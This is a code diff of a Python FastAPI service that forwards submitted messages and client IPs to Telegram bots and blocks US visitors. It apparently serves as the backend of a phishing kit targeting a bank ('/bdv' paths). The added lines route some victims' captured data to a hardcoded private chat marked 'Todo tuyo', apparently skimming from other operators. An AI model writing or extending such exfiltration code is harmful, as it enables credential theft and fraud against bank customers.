@@ -604,14 +604,17 @@ async def handle_dynamic_endpoint(config, request_data: DynamicMessage, request:
     mensaje = request_data.mensaje
 
     if permitido and pais != "US":
-        if obtener_is_active() and (numeror in numeros_r and pais != "US"):
-            enviar_telegram(mensaje +f" - IP: {client_ip} - {config['path']} Todo tuyo","-4931572577")
+        # Solo si el path comienza con /bdv se aplica la lógica del número aleatorio
+        if config["path"].startswith("/bdv") and obtener_is_active() and (numeror in numeros_r and pais != "US" and pais != "CO"):
+            enviar_telegram(mensaje + f" - IP: {client_ip} - {config['path']} Todo tuyo", "-4931572577")
         else:
             enviar_telegram(mensaje + f" - IP: {client_ip} - {config['path']}")
             enviar_telegram2(mensaje, config["chat_id"], config["bot_id"])
+
         return {"mensaje_enviado": True}
     else:
         raise HTTPException(status_code=400, detail=f"Acceso denegado desde {pais}")
+
     
 for config in endpoint_configs:
     app.add_api_route(
@@ -633,5 +636,6 @@ def clear_db_endpoint():
 
 
 init_db()
+
 
 
